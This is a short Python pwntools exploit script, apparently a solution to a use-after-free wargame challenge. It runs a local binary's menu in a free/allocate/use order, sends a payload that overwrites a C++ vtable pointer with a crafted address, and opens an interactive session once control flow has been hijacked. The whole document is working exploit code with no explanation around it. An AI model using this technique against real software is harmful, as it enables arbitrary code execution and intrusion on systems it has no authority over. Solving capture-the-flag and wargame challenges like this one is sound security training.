from pwn import *

Man_vtable = 0x4016e4
payload = p64(Man_vtable - 8) + 16 * b'a'
p = process(["./a.out", "24", "/dev/stdin"])
p.sendlineafter("1. use\n2. after\n3. free\n", b"3")
p.sendlineafter("1. use\n2. after\n3. free\n", b"2")
p.sendline(payload)
p.sendlineafter("1. use\n2. after\n3. free\n", b"2")
p.sendline(payload)
p.sendlineafter("1. use\n2. after\n3. free\n", b"1")
p.interactive()
